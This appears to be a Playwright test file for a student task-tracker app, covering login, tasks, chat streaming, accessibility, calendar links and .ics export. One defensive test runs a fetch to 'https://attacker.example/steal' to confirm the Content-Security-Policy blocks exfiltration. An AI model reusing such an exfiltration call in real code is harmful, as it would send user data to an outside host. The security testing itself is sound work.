import AxeBuilder from '@axe-core/playwright';
import { exam, expect, inDays, task, test } from './fakes.js';

const seed = (api) => {
  api.db.tasks.push(
    task({ title: 'Statistics assignment', status: 'in_progress', due_date: inDays(2), grade_weight: 30, estimated_hours: 4 }),
    task({ title: 'Lab report', status: 'not_started', due_date: inDays(-1) }),
  );
  api.db.exams.push(exam({ subject: 'Calculus II', exam_date: inDays(10), topics: ['Series'] }));
};

test('signs in with email and password and lands on the dashboard', async ({ page, api }) => {
  seed(api);
  await page.goto('/login');
  await page.getByLabel('Email Address').fill('ama@example.edu');
  await page.getByLabel('Password').fill('wrong');
  await page.getByRole('button', { name: /^sign in$/i }).click();
  await expect(page.getByText('Invalid login credentials')).toBeVisible();

  await page.getByLabel('Password').fill('correct-horse');
  await page.getByRole('button', { name: /^sign in$/i }).click();
  await expect(page.getByRole('heading', { level: 1, name: /Ama/ })).toBeVisible();
  await expect(page.getByText('Statistics assignment').first()).toBeVisible();
});

test('adds a task and completes it from the task list', async ({ page, api, signIn }) => {
  await signIn();
  await page.goto('/add');
  await page.getByLabel('Task Name *').fill('Essay draft');
  await page.getByLabel('Grade Weight (%)').fill('25');
  await page.getByRole('button', { name: 'Save Task' }).click();

  await expect(page).toHaveURL(/\/tasks$/);
  await page.getByRole('button', { name: 'Mark "Essay draft" as done' }).click();
  await expect(page.getByRole('button', { name: 'Mark "Essay draft" as not done' })).toBeVisible();
  expect(api.db.tasks[0]).toMatchObject({ title: 'Essay draft', grade_weight: 25, status: 'done' });
});

test('streams a chat reply into the page', async ({ page, api, signIn }) => {
  seed(api);
  const event = (name, data) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`;
  api.on('POST /chat/stream', () =>
    new Response(
      event('delta', { text: 'Start with the ' }) +
        event('delta', { text: 'Statistics assignment.' }) +
        event('done', { reply: 'Start with the Statistics assignment.' }),
      { headers: { 'Content-Type': 'text/event-stream' } },
    ),
  );
  await signIn();
  await page.goto('/chat');
  await page.getByRole('textbox', { name: 'Message' }).fill('What first?');
  await page.getByRole('button', { name: 'Send message' }).click();

  await expect(page.getByText('Start with the Statistics assignment.')).toBeVisible();
  expect(api.callsTo('POST /chat/stream')[0].body).toEqual({ message: 'What first?', history: [] });
});

test('refuses connections to origins outside the Content-Security-Policy', async ({ page, api, cspViolations }) => {
  void api;
  await page.goto('/landing');
  const blocked = await page.evaluate(() =>
    fetch('https://attacker.example/steal').then(
      () => false,
      () => true,
    ),
  );
  expect(blocked).toBe(true);
  expect(cspViolations.join('\n')).toContain('attacker.example');
  cspViolations.length = 0; // The only violation was the deliberate probe.
});

for (const [path, signedIn] of [
  ['/landing', false],
  ['/login', false],
  ['/', true],
  ['/tasks', true],
  ['/exams', true],
  ['/add', true],
  ['/settings', true],
]) {
  test(`has no accessibility violations, including contrast, on ${path}`, async ({ page, api, signIn }) => {
    seed(api);
    if (signedIn) await signIn();
    await page.goto(path);
    await expect(page.getByRole('heading', { level: 1 }).first()).toBeVisible();
    const { violations } = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa']).analyze();
    expect(
      violations.map((v) => ({ rule: v.id, nodes: v.nodes.slice(0, 5).map((n) => n.target.join(' ')) })),
    ).toEqual([]);
  });
}

for (const path of ['/', '/tasks', '/exams', '/chat', '/upload', '/focus', '/analytics', '/add', '/settings']) {
  test(`has no contrast violations in dark mode on ${path}`, async ({ page, api, signIn }) => {
    seed(api);
    await signIn();
    await page.addInitScript(() => localStorage.setItem('trackit_theme', 'dark'));
    await page.goto(path);
    await expect(page.getByRole('heading', { level: 1 }).first()).toBeVisible();
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    const { violations } = await new AxeBuilder({ page }).withRules(['color-contrast']).analyze();
    expect(violations.flatMap((v) => v.nodes.map((n) => `${n.target.join(' ')}: ${n.any[0]?.message}`))).toEqual([]);
  });
}

for (const theme of ['light', 'dark']) {
  test(`creates a calendar subscription link in Settings (${theme} mode)`, async ({ page, api, signIn }) => {
    await signIn();
    await page.addInitScript((value) => localStorage.setItem('trackit_theme', value), theme);
    await page.goto('/settings');
    await expect(page.locator('html')).toHaveAttribute('data-theme', theme);
    await page.getByRole('button', { name: 'Calendar' }).click();
    await page.getByRole('button', { name: 'Create subscription link' }).click();

    const link = page.getByLabel('Your subscription link');
    await expect(link).toHaveValue(/\/api\/calendar\/[\w-]{43}\.ics$/);
    expect(await link.inputValue()).toContain(api.db.calendarFeed.token);
    await expect(page.getByRole('link', { name: 'Open in calendar app' })).toHaveAttribute('href', /^webcal:\/\//);

    const { violations } = await new AxeBuilder({ page }).withTags(['wcag2a', 'wcag2aa']).analyze();
    expect(
      violations.map((v) => ({ rule: v.id, nodes: v.nodes.map((n) => `${n.target.join(' ')}: ${n.any[0]?.message}`) })),
    ).toEqual([]);
  });
}

test('downloads tasks as an .ics file', async ({ page, api, signIn }) => {
  seed(api);
  await signIn();
  await page.goto('/tasks');
  await page.getByRole('button', { name: 'Export' }).click();
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    page.getByRole('button', { name: 'Download .ics' }).click(),
  ]);
  expect(download.suggestedFilename()).toBe('trackit-tasks.ics');
  const body = await (await download.createReadStream()).toArray();
  expect(Buffer.concat(body).toString('utf8')).toContain('SUMMARY:Due: Statistics assignment');
});
